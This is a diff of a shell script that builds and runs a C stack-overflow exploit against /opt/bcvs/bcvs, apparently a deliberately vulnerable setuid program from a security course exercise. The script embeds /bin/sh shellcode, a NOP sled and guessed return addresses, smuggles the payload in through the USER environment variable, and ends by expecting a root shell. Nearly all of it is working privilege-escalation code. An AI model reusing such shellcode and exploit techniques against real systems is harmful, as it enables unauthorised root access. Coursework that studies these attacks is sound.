@@ -14,16 +14,16 @@
 ## ----------------------------------------------------- ##
 
 EXPLOIT_EXE="./exploit"
-#SPLOIT_DIR="sploit7_dir"
+SPLOIT_DIR="sploit6_dir"
 
+# Setup necessary environment
 
-#rm -rf $SPLIOT_DIR
-#mkdir -p $SPLOIT_DIR
-#cd $SPLOIT_DIR
-#mkdir -p .bcvs
-#touch .bcvs/block.list
-rm -rf exploit
-rm -rf exploit.c
+rm -rf $SPLIOT_DIR
+mkdir -p $SPLOIT_DIR
+cd $SPLOIT_DIR
+mkdir -p .bcvs
+touch .bcvs/block.list
+touch .bcvs/blah
 
 cat <<EOS > "exploit.c"
 #include <stdlib.h>
@@ -31,18 +31,14 @@ cat <<EOS > "exploit.c"
 #include <string.h>
 
 #define DEFAULT_OFFSET 0
-#define DEFAULT_BSIZE 800
+#define DEFAULT_BSIZE 256
 #define NOP 0x90
 
-#define STOP_ADDR 560
-#define START_NOPS 559
-#define START_SHELL_CODE 720
-
 // Shellcode for exec of /bin/sh
-char shellcode[] =
-  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
-  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
-  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+char shellcode[] = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
+"\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
+"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
+
 
 unsigned long get_sp(void) {
   __asm__("movl %esp, %eax");
@@ -57,33 +53,27 @@ void main(int argc, char* argv[]) {
 
   if (argc > 1) offset = atoi(argv[1]);
 
-  //We need to add offset to the stack pointer to have addr be in
-  //argv[2] for this exploit
-  addr = get_sp() + offset; //1139
+  addr = get_sp() - offset;
+
 
   ptr = buff;
-  //add 1 to account for shifting the bytes to align on word boundaries
-  long_ptr = (long *) (ptr + 1);
 
-  char *temp = ptr;
-  for (i = 0; temp < (buff+bsize); i++) {
-    *(temp++) = NOP;
-  }
-
-
-  for (i = 0; long_ptr < (buff + STOP_ADDR - 1); i += 4) {
+  long_ptr = (long *) (ptr);
+  //First we fill the buffer with our best guess of the address for
+  //the buffer in the attacked program
+  for (i = 0; long_ptr < (buff + 60); i += 4) {
 	*(long_ptr++) = addr;
   }
 
   // Setup the nop sled
-  char *buf_ptr = (char *) (ptr + 559); 
-  for (i = (buff + START_NOPS); i < (buff + bsize); ++i) {
+  char *buf_ptr = (char *) (ptr + 60); 
+  for (i = (buff + 60); i < (buff + bsize); ++i) {
     *(buf_ptr++) = NOP;
     //buff[i] = NOP;
   }
 
   // Insert our shellcode
-  ptr = (buff + START_SHELL_CODE);
+  ptr = (buff + 186);
   for (i = 0; i < strlen(shellcode); ++i) {
     *(ptr++) = shellcode[i];
   }
@@ -92,23 +82,26 @@ void main(int argc, char* argv[]) {
   printf(buff);
   return;
 }
+
 EOS
 
-# Setup necessary environment
+
+
 gcc -o exploit exploit.c
 
-OFFSET=1139
-
 SHELL_CODE=$($EXPLOIT_EXE)
-#echo "$SHELL_CODE"
+
+OFFSET=100
 
 SHELL_CODE=$($EXPLOIT_EXE $OFFSET)
-if [[ $? -ne 0 ]]; then
-  echo "Failed to generate shellcode"
-  exit -1
-fi
+#/opt/bcvs/bcvs ci "${SHELL_CODE}"
+export USER=${SHELL_CODE}
+export PATH=""
+echo ${USER}
+echo ${PATH}
 
-/opt/bcvs/bcvs co "${SHELL_CODE}"
+echo "junk" > "dummy_input"
 
-#/usr/bin/gdb /opt/bcvs/bcvs
+/opt/bcvs/bcvs co blah < dummy_input
+
 # And then hopefully you have a root shell at this point
